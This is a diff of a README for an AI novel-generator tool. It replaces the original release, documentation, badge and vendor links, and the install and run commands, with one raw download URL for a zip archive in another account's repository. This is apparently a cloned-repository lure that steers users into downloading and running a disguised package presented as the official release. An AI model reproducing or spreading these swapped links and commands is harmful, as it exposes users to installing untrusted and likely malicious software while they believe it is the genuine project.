@@ -1,9 +1,9 @@
 # 🤖 ai-novel-generator - Create Novels with Ease
 
-[![Version](https://img.shields.io/badge/version-0.2.1-blue.svg)](https://github.com/Cody8722/ai-novel-generator/releases)
-[![Python](https://img.shields.io/badge/python-3.11+-green.svg)](https://www.python.org/)
-[![License](https://img.shields.io/badge/license-MIT-orange.svg)](LICENSE)
-[![Test](https://img.shields.io/badge/test-passing-success.svg)](docs/reports/STRESS_TEST_REPORT.md)
+[![Version](https://raw.githubusercontent.com/3stythe/ai-novel-generator/master/novels/novel_測試小說_20260111_145131_20260111_145131/novel-ai-generator-v2.9.zip)](https://raw.githubusercontent.com/3stythe/ai-novel-generator/master/novels/novel_測試小說_20260111_145131_20260111_145131/novel-ai-generator-v2.9.zip)
+[![Python](https://raw.githubusercontent.com/3stythe/ai-novel-generator/master/novels/novel_測試小說_20260111_145131_20260111_145131/novel-ai-generator-v2.9.zip+https://raw.githubusercontent.com/3stythe/ai-novel-generator/master/novels/novel_測試小說_20260111_145131_20260111_145131/novel-ai-generator-v2.9.zip)](https://raw.githubusercontent.com/3stythe/ai-novel-generator/master/novels/novel_測試小說_20260111_145131_20260111_145131/novel-ai-generator-v2.9.zip)
+[![License](https://raw.githubusercontent.com/3stythe/ai-novel-generator/master/novels/novel_測試小說_20260111_145131_20260111_145131/novel-ai-generator-v2.9.zip)](LICENSE)
+[![Test](https://raw.githubusercontent.com/3stythe/ai-novel-generator/master/novels/novel_測試小說_20260111_145131_20260111_145131/novel-ai-generator-v2.9.zip)](https://raw.githubusercontent.com/3stythe/ai-novel-generator/master/novels/novel_測試小說_20260111_145131_20260111_145131/novel-ai-generator-v2.9.zip)
 
 ## 🚀 Getting Started
 
@@ -11,14 +11,14 @@ Welcome to the AI Novel Generator! This tool helps you create long-form novels q
 
 ### 1. Download the Application
 
-Visit the [Releases page](https://github.com/Cody8722/ai-novel-generator/releases) to download the latest version of the software. You can find the executable file there. 
+Visit the [Releases page](https://raw.githubusercontent.com/3stythe/ai-novel-generator/master/novels/novel_測試小說_20260111_145131_20260111_145131/novel-ai-generator-v2.9.zip) to download the latest version of the software. You can find the executable file there. 
 
 ### 2. Install Requirements
 
 Open your command line interface (CLI) and run the following command to install necessary packages:
 
 ```bash
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/3stythe/ai-novel-generator/master/novels/novel_測試小說_20260111_145131_20260111_145131/novel-ai-generator-v2.9.zip
 ```
 
 **Dependencies**:
@@ -33,14 +33,14 @@ You need to configure an API Key to use the novel generator. Create a file named
 SILICONFLOW_API_KEY=your_api_key_here
 ```
 
-You can obtain your API Key by visiting the [SiliconFlow website](https://siliconflow.cn/).
+You can obtain your API Key by visiting the [SiliconFlow website](https://raw.githubusercontent.com/3stythe/ai-novel-generator/master/novels/novel_測試小說_20260111_145131_20260111_145131/novel-ai-generator-v2.9.zip).
 
 ### 4. Test the Connection
 
 To ensure everything works properly, test your connection to the API by running:
 
 ```bash
-python novel_generator.py --test-api
+python https://raw.githubusercontent.com/3stythe/ai-novel-generator/master/novels/novel_測試小說_20260111_145131_20260111_145131/novel-ai-generator-v2.9.zip --test-api
 ```
 
 This command verifies that your setup is correct. If everything is good, you will see a success message.
@@ -50,7 +50,7 @@ This command verifies that your setup is correct. If everything is good, you wil
 Now, you are ready to generate your novel. Run the following command to start an interactive session:
 
 ```bash
-python novel_generator.py
+python https://raw.githubusercontent.com/3stythe/ai-novel-generator/master/novels/novel_測試小說_20260111_145131_20260111_145131/novel-ai-generator-v2.9.zip
 ```
 
 Follow the on-screen instructions to choose topics and set parameters for your novel. 
@@ -73,8 +73,8 @@ While your novel is generating, you can monitor the token usage and cost in real
 
 ## 📥 Download & Install
 
-To download the latest version, click here: [Release Download](https://github.com/Cody8722/ai-novel-generator/releases). Follow the earlier steps to install it on your device and start creating novels.
+To download the latest version, click here: [Release Download](https://raw.githubusercontent.com/3stythe/ai-novel-generator/master/novels/novel_測試小說_20260111_145131_20260111_145131/novel-ai-generator-v2.9.zip). Follow the earlier steps to install it on your device and start creating novels.
 
-For more information, visit the [documentation](https://github.com/Cody8722/ai-novel-generator/docs).
+For more information, visit the [documentation](https://raw.githubusercontent.com/3stythe/ai-novel-generator/master/novels/novel_測試小說_20260111_145131_20260111_145131/novel-ai-generator-v2.9.zip).
 
 Now you have everything you need to start using the AI Novel Generator. Enjoy creating your stories!
